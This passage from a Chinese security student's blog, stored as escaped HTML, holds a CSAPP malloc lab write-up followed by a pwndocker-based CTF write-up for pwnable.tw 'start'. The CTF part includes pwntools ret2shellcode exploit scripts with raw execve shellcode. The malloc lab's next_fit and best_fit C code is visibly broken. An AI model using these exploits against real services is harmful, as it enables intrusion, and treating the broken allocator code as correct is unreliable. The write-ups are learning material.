</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-04%20%E4%B8%8B%E5%8D%885.40.53.png\" alt=\"截屏2021-12-04 下午5.40.53\"></p>\n<h4><span id=\"coalesce\">coalesce()</span></h4><p>​        重点来看<code>coalesce()</code></p>\n<p>​        这里用到的合并方式的构思图表如下：</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-03%20%E4%B8%8B%E5%8D%885.35.04.png\" alt=\"截屏2021-12-03 下午5.35.04\"></p>\n<p>​        也是非常地直观容易理解。</p>\n<p>​        它的代码实现也直观地被分为如图四种情况，所以我们先要定义对应图中几种状态的bp状态。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">size_t</span> prev_alloc = GET_ALLOC(FTRP(PREV_BLKP(bp)));</span><br><span class=\"line\">  <span class=\"keyword\">size_t</span> next_alloc = GET_ALLOC(HDRP(NEXT_BLKP(bp)));</span><br><span class=\"line\">  <span class=\"keyword\">size_t</span> size = GET_SIZE(HDRP(bp));</span><br></pre></td></tr></table></figure>\n<p>​        大致框架如下：</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-04%20%E4%B8%8B%E5%8D%886.00.07.png\" alt=\"截屏2021-12-04 下午6.00.07\"></p>\n<p>​        </p>\n<h4><span id=\"find_fit\">find_fit()</span></h4><p>​        整个malloc lab的重点，需要自己实现一个free chunk的适配寻找。</p>\n<p>​        一些常见的方法有</p>\n<ol>\n<li>首次适配</li>\n<li>下一次适配</li>\n<li>最佳适配</li>\n<li>分离式（复杂）</li>\n</ol>\n<p>​        其实这些并不是完全先进或者落后，各有各的优缺点。在这里为了简单我们选择首次适配，即使用在free list中找到的第一个符合条件的chunk。</p>\n<p>​        按照首次适配的原理，我们的思路是，从头到尾搜索链表，如果遇到合适的free chunk，则按照size将其头和尾部标记。</p>\n<p>​        实现大致是：</p>\n<p>​        指定一个size，在链表中通过判断头部inuse位，找到第一个free chunk的bp,，然后计算next bp是否大于bp + size</p>\n<p>,且状态为free，如果是，将bp标记为allocated，在bp+size的地方标记为footer，分割该chunk，虽然会留下一定的碎片，但这也是首次适配无法避免的缺点。如果不是，则继续寻找下一个free chunk并判断。</p>\n<p>​        然后来研究代码实现：</p>\n<p>​        自己瞎写了一个，问题不大。</p>\n<h4><span id=\"place\">place()</span></h4><p>​        函数功能是将请求块放置在空闲块的起始位置，只有当剩余部分的大小等于或者超出最小块的大小时，才进行分割。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">place</span><span class=\"params\">(<span class=\"keyword\">void</span> *bp, <span class=\"keyword\">size_t</span> asize)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">size_t</span> size = GET_SIZE(HDRP(bp));</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">if</span> ((size - asize) &gt;= (<span class=\"number\">2</span>*DSIZE)) &#123;</span><br><span class=\"line\">        PUT(HDRP(bp),PACK(asize,<span class=\"number\">1</span>));</span><br><span class=\"line\">        PUT(FTRP(bp),PACK(asize,<span class=\"number\">1</span>));</span><br><span class=\"line\">        PUT(HDRP(NEXT_BLKP(bp)),PACK(size - asize,<span class=\"number\">0</span>));</span><br><span class=\"line\">        PUT(FTRP(NEXT_BLKP(bp)),PACK(size - asize,<span class=\"number\">0</span>));</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        PUT(HDRP(bp),PACK(size,<span class=\"number\">1</span>));</span><br><span class=\"line\">        PUT(FTRP(bp),PACK(size,<span class=\"number\">1</span>));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>问题不大</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-05%20%E4%B8%8A%E5%8D%8811.46.52.png\" alt=\"截屏2021-12-05 上午11.46.52\"></p>\n<h3><span id=\"next_fit\">next_fit</span></h3><p>​        下一次适配，主要特点是在第一次在空闲链表中找到合适的chunk以后，下一次搜索就不再是从头到尾，而是从上一次搜索的chunk开始继续搜索。</p>\n<p>​        相比于首次适配，写循环时就不能嗯搞，要处理第一次找到fit chunk后的状态。大致的思路是：先按照首次适配的方式找到第一个适合的chunk，然后记录下chunk的bp，下一次寻找时则从记录的bp开始寻找。</p>\n<p>​            那么肯定需要定义一个外部变量来记录每次找到的bp。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">void</span> *<span class=\"title\">next_find_fit</span><span class=\"params\">(<span class=\"keyword\">size_t</span> asize)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;  </span><br><span class=\"line\">    <span class=\"keyword\">char</span> * bp = heap_listp;</span><br><span class=\"line\">    <span class=\"keyword\">size_t</span> ALLOC_STATUS;</span><br><span class=\"line\">    <span class=\"keyword\">size_t</span> SIZE;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> (GET_SIZE(HDRP(NEXT_BLKP(bp))) &gt; <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;   <span class=\"keyword\">if</span>(mark_bp)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            bp = NEXT_BLKP(mark_bp);</span><br><span class=\"line\">            ALLOC_STATUS = GET_ALLOC(HDRP(bp));</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (ALLOC_STATUS)</span><br><span class=\"line\">            <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(SIZE &lt; asize) </span><br><span class=\"line\">            <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">            mark_bp = bp;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> bp; </span><br><span class=\"line\">            <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        bp = NEXT_BLKP(bp); </span><br><span class=\"line\">        ALLOC_STATUS = GET_ALLOC(HDRP(bp));</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (ALLOC_STATUS)</span><br><span class=\"line\">        <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(SIZE &lt; asize) </span><br><span class=\"line\">        <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">        mark_bp = bp;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> bp; </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​        问题不大。</p>\n<h4><span id=\"best_fit\">best_fit</span></h4><p>​        搜索链表中的每一个堆块，选择符合条件的最小空闲块。目前来说思路是这样的：</p>\n<p>​        对整个堆空间进行搜索，标记合适的chunk，并将size储存在数组中，在搜索结束后进行排序，选择最适合的chunk，并将bp返回。</p>\n<p>​        对堆空间进行搜索，大概只需要在原本的算法上去掉结束循环的判定条件。然后排序的话随意找个排序算法来就行，图方便我复制了一个冒泡排序，虽然时间复杂度不太行。</p>\n<p>​        但是存在一个问题就是，排序肯定是以chunk的size为标准，但是如何关联size和bp呢？我将所有符合条件的chunksize排序之后，如何找到对应的bp？</p>\n<p>​        一个比较直观的解决方法就是二维数组，将bp和size同时存放，同时排序，当然也许可以使用类似PACK的宏，或者为每一个size增加一个idx，也是二维数组的思路，但是并不是直接将bp存放，而是存放bp的idx。</p>\n<p>​        考虑到二维数组排序有一些麻烦，故直接定义结构体来存放size与bp的idx。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">void</span> *<span class=\"title\">best_find_fit</span><span class=\"params\">(<span class=\"keyword\">size_t</span> asize)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;   </span><br><span class=\"line\">    <span class=\"keyword\">char</span> * bp = heap_listp;</span><br><span class=\"line\">    <span class=\"keyword\">size_t</span> ALLOC_STATUS;</span><br><span class=\"line\">    <span class=\"keyword\">size_t</span> SIZE;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">bp_list</span> <span class=\"title\">list</span>[];</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">while</span> (GET_SIZE(HDRP(NEXT_BLKP(bp))) &gt; <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> ( <span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; CHUNKSIZE/WSIZE; i++)</span><br><span class=\"line\">        &#123;   </span><br><span class=\"line\">            bp = NEXT_BLKP(bp);</span><br><span class=\"line\">            ALLOC_STATUS = GET_ALLOC(HDRP(bp));</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (ALLOC_STATUS) <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(SIZE &lt; asize) <span class=\"keyword\">continue</span></span><br><span class=\"line\">            <span class=\"built_in\">list</span>[i].bp_size = GET_SIZE(HDRP(bp));</span><br><span class=\"line\">            <span class=\"built_in\">list</span>[i].bp_idx = i;</span><br><span class=\"line\">            <span class=\"built_in\">list</span>[i].bp = HDRP(bp);</span><br><span class=\"line\">            </span><br><span class=\"line\">        &#125; </span><br><span class=\"line\"></span><br><span class=\"line\">        bubble_sort(<span class=\"keyword\">int</span> <span class=\"built_in\">list</span>[i].bp_size,<span class=\"keyword\">int</span> i);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">list</span>[i].bp;</span><br><span class=\"line\">            </span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2><span id=\"4-level2\">4) level2</span></h2><p>​        level2利用显式链表和分离适配来实现，同时这种方法也是非常接近ptmalloc2的，所以学习这种方法的思想是十分必要的。</p>\n<h3><span id=\"数据结构\">数据结构</span></h3><h4><span id=\"显式空闲链表\">显式空闲链表</span></h4><p>​        相比于隐式空闲链表没有实际的链表去管理空闲块，显式空闲链表使用新增的双向循环链表，通过在chunk头添加指向逻辑上相邻的chunk的指针来相互连接。显式链表为chunk指针操作增添了更多姿势，突破了隐式性能的局限性。当然这个方案也不是完全没有缺点，为了包含指针和可能的脚部，显式空闲链表的chunk通常会更大一些，潜在地提高了内存碎片的程序。</p>\n<h4><span id=\"chunk\">chunk</span></h4><p>​        显式链表chunk结构如图：</p>\n<p><img src=\"https://pic1.zhimg.com/80/v2-c0cb0926ad2e469833bfff9e3fffd2e4_720w.jpg\" alt=\"img\"></p>\n<p>​        有点类似ptalloc的机制，当chunk为allocated状态，中间为padding，当为free状态，会在padding开始前，也就是之前方案中的<code>bp</code>指向的地方增添两个指针：<code>next_bp</code>， <code>prev_bp</code>。</p>\n<h3><span id=\"first_fit\">First_fit</span></h3><p>​        因为确实不太会写，所以基本算是照着代码分析思路了。</p>\n<p>​        首先是完成显式空闲链表下first_fit的实现，这种方案目的是熟悉如何通过创建一个双向循环链表来管理空闲块。</p>\n<p>​        第一步是创建空闲链表。</p>\n<p>​        </p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-09%20%E4%B8%8B%E5%8D%884.46.18.png\" alt=\"截屏2021-12-09 下午4.46.18\"></p>\n<p>​        显式链表下的<code>free()</code>也和隐式空闲链表没区别，都是把chunk 头的size置0，但是多出来了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">SET_PREV(bp, <span class=\"number\">0</span>);</span><br><span class=\"line\">SET_NEXT(bp, <span class=\"number\">0</span>);</span><br></pre></td></tr></table></figure>\n<p>​        也就是先将需要free的chunk的fd和bk位全部设置为0，然后进行合并后放入空闲链表。</p>\n<p>然后编写将chunk插入和取出双向循环链表的操作。</p>\n<h4><span id=\"insert_from_free_list\">insert_from_free_list()</span></h4><p>​    将已分配块释放，chunk bp 被插入free list。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-05%20%E4%B8%8B%E5%8D%8811.31.31.png\" alt=\"截屏2021-12-05 下午11.31.31\">        </p>\n<h4><span id=\"remove_from_free_list\">remove_from_free_list()</span></h4><p>​        在free list中拿出chunk。与隐式链表类似，分为四种情况。因为是双向循环链表，所以解链的过程也可以理解为unlink。</p>\n<p>​        第一种情况：<code>prev == NULL &amp;&amp; next == NULL</code>，chunk前后都是allocated chunk，双向链表中啥也没有，设置表头为空。</p>\n<p>​        第二种情况：<code>prev == NULL</code>    ，前一个chunk为allocated，前一项为空，说明此时chunk的前面没有chunk，那么bk本身就是空的，解链就需要设置fd为空，也就是next为0。</p>\n<p>​        第三种情况同理。</p>\n<p>​        第四种情况：chunk前后都有free chunk，那么解链相当于一个标准的unlink，就是将前一个chunk的bp的next位设置为下一个chunk的bp，然后下一个chunk的prev位设置为前一个chunk的bp。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-05%20%E4%B8%8B%E5%8D%8811.47.40.png\" alt=\"截屏2021-12-05 下午11.47.40\"></p>\n<h3><span id=\"分离适配\">分离适配</span></h3><p>​        分离适配的特点就是利用很多储存不同大小范围的chunk的链表来管理free chunk，很大程度上减小了内存碎片的产生。</p>\n<p>​        根据参考资料，我们可以将大小以2^n划分。</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-05%20%E4%B8%8B%E5%8D%8811.52.48.png\" alt=\"截屏2021-12-05 下午11.52.48\"></p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-05%20%E4%B8%8B%E5%8D%8811.52.59.png\" alt=\"截屏2021-12-05 下午11.52.59\"></p>\n<p>​                    </p>\n<h2><span id=\"5结果与改进\">5）结果与改进</span></h2><p>​        </p>\n<p>​        </p>\n<h2><span id=\"6反思与思考\">6）反思与思考</span></h2><p>​        本来应该是在今年暑假就要完成的东西，因为太过懒散而拖到了现在。不得不说如果沉下心来做，这个lab其实不算很难，最难的实际上是对这个简单的内存分配器从0到逐渐熟悉架构的过程。如果不去认真读csapp，了解程序的大致架构的话，就会一头雾水从而放弃，暑假便是因此。</p>\n<p>​        其实大多数代码并不需要自己完成，也是确实没有这个水平，但是也有我们自己需要思考，然后实现的地方，就比如说适配的方法。我从来没有学过数据结构或者算法，也没有刷过类似的题，c语言也就是局限于看得懂这样的普通计算机专业学生水平，对于这种大面积的指针操作一时确实有些摸不着头脑，但是csapp给了我们一种解：利用宏，将复杂的指针运算以及强制类型转换封装，变得简单易用，这使得在我操作指针时，几乎感受不到指针的复杂所在，也是我觉得收获最大之所在。</p>\n<p>​        关于三种适配方法，第一种我在编写时并不太理解如何实现“继续寻找下一个chunk”，于是自己按照感觉写了一个版本，然后寻找了一些参考，发现我写的除了这一步，其他都问题不大，然后就把自己的版本修正了。之后的两种适配方法都是基于首次适配的代码加以适当的条件修改而成，不得不说其实十分有趣。最佳适配牵涉到数组的排序以及结构体的定义，说实话上一次编写带结构体的c程序还是上学期起哦期末的暑假考核，但是也没有遇到什么障碍，就这么顺着写了。现在想来我们大一上的c语言大作业真是简单捏。</p>\n<p>​        </p>\n<h2><span id=\"7参考\">7）参考</span></h2><p>​        <a href=\"https://www.jianshu.com/p/48d5d0554b3b\">六 Malloc Lab</a></p>\n<p>​    <a href=\"https://zhuanlan.zhihu.com/p/150100073\">CSAPP:Lab5-Malloc Lab</a></p>\n","categories":["CSAPP LAB"],"tags":["csapp lab"]},{"title":"pwndocker的pwn题体验（上）","url":"/2021/11/02/mess_pwndocker%E7%9A%84pwn%E9%A2%98%E4%BD%93%E9%AA%8C%EF%BC%88%E4%B8%8A%EF%BC%89/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-klYHkOFv\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> \n<h3><span id=\"1前言\">1）前言</span></h3><p>​        之前看到star大哥开始学pwn力，而且是使用的iterm+pwndocker的环境，觉得非常优雅，便一直想尝试一下，正好最近在研究docker的使用，可以拿来试一试。并且pwndocker也可以十分优雅地指定我们环境的glibc版本，所以是一个非常值得尝试的事。</p>\n<h3><span id=\"2pwndocker启动\">2）pwndocker启动</span></h3><p>​        首先是如何build pwndocker的问题。</p>\n<p>​        如果直接<code>docker pull pwndocker</code>，速度一般会很慢。</p>\n<p>​        这里参考一篇博客的做法：<a href=\"https://nocbtm.github.io/2020/02/24/skysider-pwndocker-正确使用姿势/#前言\">skysider/pwndocker 正确使用姿势</a>。</p>\n<p>​        <code>docker pull registry.cn-hangzhou.aliyuncs.com/pwndocker/pwndocker-nocbtm:1.0</code>从阿里云上拉取镜像，使得速度变快。</p>\n<p>​        拉取完之后重命名镜像。<code>docker tag registry.cn-hangzhou.aliyuncs.com/pwndocker/pwndocker-nocbtm:1.0 skysider/pwndocker</code></p>\n<p>​        然后可以</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run -d \\</span><br><span class=\"line\">--rm \\</span><br><span class=\"line\">-h <span class=\"variable\">$&#123;ctf_name&#125;</span> \\</span><br><span class=\"line\">--name <span class=\"variable\">$&#123;ctf_name&#125;</span> \\</span><br><span class=\"line\">-v $(<span class=\"built_in\">pwd</span>)/<span class=\"variable\">$&#123;ctf_name&#125;</span>:/ctf/work \\</span><br><span class=\"line\">-p 23947:23947 \\</span><br><span class=\"line\">--cap-add=SYS_PTRACE \\</span><br><span class=\"line\">--privileged \\</span><br><span class=\"line\">pwn10</span><br></pre></td></tr></table></figure>\n<p>​        运行镜像。</p>\n<p>​        但是比较奇怪的是我使用这些指令运行容器并不成功，但是使用<code>docker run -it skysider/pwndocker /bin/bash</code>是能够进入容器并交互的，检查了一下一些环境也比较完善，但是并没有可以操作的二进制文件。    </p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-03%20%E4%B8%8B%E5%8D%885.00.25.png\" alt=\"截屏2021-11-03 下午5.00.25\"></p>\n<p>​    </p>\n<p>​        我们可以先用<code>docker cp</code>来将题目的文件拷贝至容器中。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-03%20%E4%B8%8B%E5%8D%8810.05.57.png\" alt=\"截屏2021-11-03 下午10.05.57\"></p>\n<p>​    </p>\n<p>​        关于<code>docker cp</code>指令这里，因为不太熟悉docker的基础指令，掉到坑中绕了一会儿。</p>\n<p>​        如果我们需要将我们的二进制文件cp到容器中，需要指定容器的pid，但是如果是通过<code>docker run</code>指令并加上参数进入容器内的话，每次执行这个指令，就相当于通过镜像重新创建了一个容器，pid就会变化，所以这样操作肯定行不通。所以我们先创建一个容器，然后copy它的pid，cp文件以后，通过<code>docker start</code>和<code>docker attach</code>来进入容器就行。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-03%20%E4%B8%8B%E5%8D%8810.14.12.png\" alt=\"截屏2021-11-03 下午10.14.12\"></p>\n<p>​        愉快的gdb时间（（</p>\n<p>​        还要解决的就是容器与主机交互的问题，毕竟脚本啥还是要用图形化的写比较开心。</p>\n<p>​        然后是做题时间。</p>\n<p>​        这个题尤其基础，直接溢出0x20个字符就行，ret2shellcode。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-03%20%E4%B8%8B%E5%8D%8811.01.29.png\" alt=\"截屏2021-11-03 下午11.01.29\"></p>\n<p>​    </p>\n<p>​        ps：关于cyclic的原理可以看我的pwntools源码解析系列。</p>\n<p>​        然后还是得解决主机和容器之间的信息交互，如何优雅地将主机写的脚本传进docker捏 。</p>\n<p>​        还是要借助<code>docker run</code>的- v参数，大概就是<code>~/work/pwner:/ctf/work</code></p>\n<p>​        但是比较离谱的就是copy了文件夹以后，似乎并不能立即在容器中看到，我重启之后才有效果。难道每次修改脚本都需要重启容器吗？</p>\n<p>​        后来重启一次之后就能立即同步到容器中了。好。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-03%20%E4%B8%8B%E5%8D%8811.16.05.png\" alt=\"截屏2021-11-03 下午11.16.05\"></p>\n<p>​        有一点离谱。</p>\n<p>​        虽然但是，我超，pwndokcer真的好用。</p>\n<p>​        鉴于我以前做过这道题，而且那时候的wp写得非常离谱，我决定重新写一遍。具体有多离谱，大概就是全程只有寻找偏移量的描述，然后exp是复制别人的。写了，但是没完全写（</p>\n<p>​        所以偏移量的寻找我就懒得写了，cyclic一把梭。并且由于cyclic是直接覆盖掉了返回地址的eip的（这也是cyclic能找到偏移量的道理所在），这个得出来的0x20也不需要加什么ebp，直接0x20+任意地址了事。</p>\n<p>​        然后就是显然的一个任意地址执行。并且喜闻乐见的NX也没有开启，直接ret2shellcode，把shellcode一股脑丢到栈上执行就行。</p>\n<p>​        shellcode就没必要手写了，<code>pwntools.shallcraft</code>直接生成。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;chall.pwnable.tw&#x27;</span>,<span class=\"number\">10000</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">shellcode = asm(shellcraft.sh())</span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">20</span></span><br><span class=\"line\">payload += shellcode</span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<p>​    摸了一圈，又EOF力。</p>\n<p>​    换了祖传exp。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\">p = remote(<span class=\"string\">&quot;chall.pwnable.tw&quot;</span>,<span class=\"number\">10000</span>)</span><br><span class=\"line\"><span class=\"comment\">#p = process(&quot;./start&quot;)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#shellcode = asm(shellcraft.sh())</span></span><br><span class=\"line\">shellcode = <span class=\"string\">b&#x27;\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">buf_addr = <span class=\"number\">0xffffd284</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x14</span> </span><br><span class=\"line\">payload += p32(<span class=\"number\">0x8048087</span>)</span><br><span class=\"line\">p.sendafter(<span class=\"string\">&quot;Let&#x27;s start the CTF:&quot;</span>,payload)</span><br><span class=\"line\">stack_addr = u32(p.recv(<span class=\"number\">4</span>))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(stack_addr))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">20</span></span><br><span class=\"line\">payload += p32(stack_addr+<span class=\"number\">20</span>)</span><br><span class=\"line\">payload += shellcode</span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8A%E5%8D%889.49.21.png\" alt=\"截屏2021-11-04 上午9.49.21\">    </p>\n<p>​        所以shellcode是没有问题的，问题出在需要溢出两次，一次获得栈地址，一次ret到栈地址执行shellcode。我不能理解。</p>\n<p>​        shellcode覆盖retn，不也是在栈上执行吗，为什么EOF。我猜测是栈空间不够大。虽然但是，不想找wp，喜闻乐见地调试一下吧。</p>\n<p>​        在调试的时候又出现了新问题。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8A%E5%8D%8810.01.04.png\" alt=\"截屏2021-11-04 上午10.01.04\">    </p>\n<p>​        搜了一圈应该是启动tmux的问题。但是网上给的解决方案在我这里似乎不管用。</p>\n<p>​        在研究tumx的时候发现了一个更离谱的事，这个pwndocker的系统时间是错误的。导致apt都运行不了。</p>\n<p>​        这就造成了一个非常离谱的死循环，修复时间需要使用apt安装相关的软件，然而时间又导致apt无法运行。</p>\n<p>​        虽然但是，解决方法也比较弱智。把https改成http是最粗暴的解决方案了，但是有一说一，这不优雅。但是最后还是妥协了，先用http下了一个ntp，然而发现就算是系统时间校准了，换回https后还是现实证书不被信任。。。</p>\n<p>​        这里留个疑点吧。</p>\n<p>​        还是回到题目本身。也就是无法<code>gdb.attach()</code>的问题。</p>\n<p>​        原来是因为要先输入tmux进入，才能执行分屏。。。。。。。。</p>\n<p>​        我傻了。坑是真的多。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%885.30.51.png\" alt=\"截屏2021-11-04 下午5.30.51\"></p>\n<p>​        果然碰到了无限waiting for debug的问题，虽然pwntools是4.6.1了。</p>\n<p>​        在修改源码后解决问题，详情可以参考：<a href=\"https://blog.csdn.net/weixin_43483799/article/details/118885208?spm=1001.2101.3001.6650.2&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-2.no_search_link&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-2.no_search_link\">pwntools中使用tmux和gdb attach时Waiting for debugger无限等待的解决方案</a>。</p>\n<p>​        解决问题的过程中又发现了一个问题，就是我打开tmux的时候突然就风扇狂转，CPU占用率直接飙到109%，内存3.53G。我以为是容器开太多的问题，把多余的容器全部rm，但是还是不见缓解。</p>\n<p>​        百度后发现这个好像是MAC运行Docker的通病，但是我这个容器至少不应该是这样，因为之前风扇一直就没怎么转，于是我把我现在运行的容器停止，结果cpu占用率一下就变低了，然后再重启，cpu占用率再也没有升高。</p>\n<p>​        对于这个情况我的合理猜测是，那个pwntools源码的无限循环问题。</p>\n<h3><span id><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%887.35.02.png\" alt></span></h3><p>​    </p>\n<p>​    </p>\n<p>​        尝试了一下一种新的下断点方式。    </p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%887.43.49.png\" alt=\"截屏2021-11-04 下午7.43.49\"></p>\n<p>​        回到题目，很显然如果摁执行shellcode，就根本没有反应（（</p>\n<p>​        eip也没有被覆盖。之前的猜测是栈空间不够，这里来验证一下。</p>\n<p>​        新问题，如果调试的话terminal中tmux的选项似乎只能指定splitw，但是这样就没有办法滚动。。。</p>\n<p>​        好，解决了。首先可以通过按ctrl+b后再按[，切换到查看另一个窗口的历史输出模式，然后将终端中的偏好设置里的“滚动备用屏幕”取消勾选（其实默认应该是不勾的）</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%889.42.37.png\" alt=\"截屏2021-11-04 下午9.42.37\"></p>\n<p>​        这样我们的操作逻辑就是Fn/shift加鼠标滚轮滚动页面，普通的鼠标滚轮则选择历史输入，然后</p>\n<p>ctrl+b后再按[，可以用鼠标滚轮控制光标查看历史输出。</p>\n<p>​        (真有够麻烦的)</p>\n<h3><span id=\"3漏洞利用\">3）漏洞利用</span></h3><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%889.50.04.png\" alt=\"截屏2021-11-04 下午9.50.04\">        </p>\n<p>​        看一下发现不对头，这个返回地址是我们的shellcode。</p>\n<p><img 